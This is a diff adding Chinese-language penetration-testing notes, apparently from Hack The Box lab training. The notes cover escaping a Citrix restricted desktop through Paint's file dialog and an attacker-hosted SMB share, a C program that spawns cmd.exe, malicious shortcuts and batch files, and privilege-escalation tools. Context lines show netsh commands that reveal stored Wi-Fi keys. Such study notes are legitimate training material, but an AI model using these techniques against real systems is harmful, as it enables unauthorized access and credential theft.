@@ -103,6 +103,40 @@ Wifi
 C:\htb> netsh wlan show profile
 C:\htb> netsh wlan show profile WIFINAME key=clear
 
+***
+Citrix
+运行 Paint，然后点击 File > Open,        在“文件名”字段下输入 UNC 路径 \\127.0.0.1\c$\users\pmorgan
+root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
+在与 Paint 关联的这个 Windows 对话框中，在指定的 "File name" 字段中输入 UNC 路径 \\10.13.38.95\share        从目标连接atc机的smb，(或托管citrix的机器)
+右键单击 pwn.exe 二进制文件并选择 Open
+                        #include <stdlib.h>
+                        int main() {
+                          system("C:\\Windows\\System32\\cmd.exe");
+                        }
+使用获取的 cmd 访问权限将文件从 SMB 共享复制文件
+
+**
+Q-Dir 或 Explorer++
+        https://explorerplusplus.com/
+**
+GUI注册表修改工具:
+        https://sourceforge.net/projects/simpregedit/
+        https://sourceforge.net/projects/uberregedit/
+        https://sourceforge.net/projects/sre/
+
+**
+修改快捷方式指向        Window\Sysyem32\cmd.exe
+创建恶意快捷方式
+
+**
+创建一个txt，名为 "evil.bat"
+使用文本编辑器（如 Notepad）打开
+在文件中输入 "cmd"
+执行
+使用像 Winpeas 和 PowerUp 这样的工具来识别操作系统内潜在的安全问题和漏洞
+        https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+        https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+**
 
 
 
